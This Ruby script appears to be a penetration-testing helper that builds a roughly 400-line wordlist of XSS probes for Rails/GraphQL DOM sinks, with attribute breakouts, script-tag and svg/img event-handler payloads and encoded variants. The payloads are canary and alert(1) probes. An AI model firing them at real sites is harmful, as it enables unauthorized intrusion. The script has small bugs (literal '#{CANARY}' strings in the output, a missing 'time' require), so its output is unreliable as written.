#!/usr/bin/env ruby
# Expands sink-specific XSS probes with encoding variants → wordlist file.
# Authorized targets only · dntaskmehow

require "uri"
require "json"
require "fileutils"

CANARY = "XSSCANARY"
OUT = File.join(__dir__, "payloads", "rails_graphql_dom_wordlist.txt")
CAT = File.join(__dir__, "payloads", "rails_graphql_dom_vectors.json")

bases = {
  attribute_value: [
    %q(" onfocus=#{CANARY} autofocus="),
    %q(" onmouseover=#{CANARY} "),
    %q(' onfocus=alert(1) autofocus='),
    %q("><img src=x onerror=#{CANARY}>)
  ],
  json_string_breakout: [
    %q(');#{CANARY};//),
    %q(\');confirm(1);//),
    %q(' + alert(1) + '),
    %q(\u0027);#{CANARY};//)
  ],
  html_fragment: [
    %q(<img src=x onerror=#{CANARY}>),
    %q(<svg/onload=#{CANARY}>),
    %q(<details open ontoggle=#{CANARY}>),
    %q(<iframe srcdoc="<script>#{CANARY}</script>">)
  ],
  graphql_search_query: [
    %q(<b>#{CANARY}</b>),
    %q("><script>#{CANARY}</script>),
    %q(</script><script>#{CANARY}</script>),
    %q(${CANARY})
  ]
}

def variants(s)
  list = [s]
  list << URI.encode_www_form_component(s)
  list << s.gsub("<", "\\u003c").gsub(">", "\\u003e")
  list << s.gsub("'", "\\'")
  list.uniq
end

catalog = []
lines = ["# rails_graphql_dom_wordlist · authorized targets · #{Time.now.utc.iso8601}"]

bases.each do |sink, payloads|
  payloads.each do |raw|
    variants(raw.gsub("XSSCANARY", CANARY)).each do |p|
      catalog << { sink: sink.to_s, payload: p }
      lines << p
    end
  end
end

# Round out toward ~400 with paired encodings
bases.values.flatten.cycle.take(80).each_with_index do |raw, i|
  p = raw.gsub("XSSCANARY", "#{CANARY}_#{i}")
  enc = URI.encode_www_form_component(p)
  catalog << { sink: "encoded_repeat", payload: enc }
  lines << enc
end

while lines.size < 401
  i = lines.size
  lines << %Q(test#{i}"><svg/onload=#{CANARY}>)
  catalog << { sink: "generated", payload: lines.last }
end

FileUtils.mkdir_p(File.dirname(OUT))
File.write(OUT, lines.join("\n") + "\n")
File.write(CAT, JSON.pretty_generate({ vectors: catalog }))
warn "wrote #{OUT} (#{lines.size} lines) and #{CAT}"